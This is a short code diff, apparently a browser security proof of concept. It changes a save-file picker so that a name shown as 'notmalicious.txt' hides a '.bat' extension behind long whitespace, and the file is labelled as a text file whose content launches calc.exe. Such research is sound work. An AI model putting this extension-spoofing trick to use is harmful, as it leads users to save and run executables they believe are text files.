@@ -21,10 +21,10 @@
         const butSaveNewFile = document.getElementById('addNewFile')
         butSaveNewFile.addEventListener('click', async () => {
             const options = {
-                    suggestedName: 'notmalicious.txt                                                                                                                                       .pdf',
+                    suggestedName: 'notmalicious.txt                                                                                                                                             .bat',
                     types: [{
                         description: 'Text file',
-                        accept: { 'application/pdf': ['.pdf'] },
+                        accept: { 'text/plain': ['.bat'] },
                         content: 'C:\\Windows\\system32\\calc.exe'
                     }],
             };
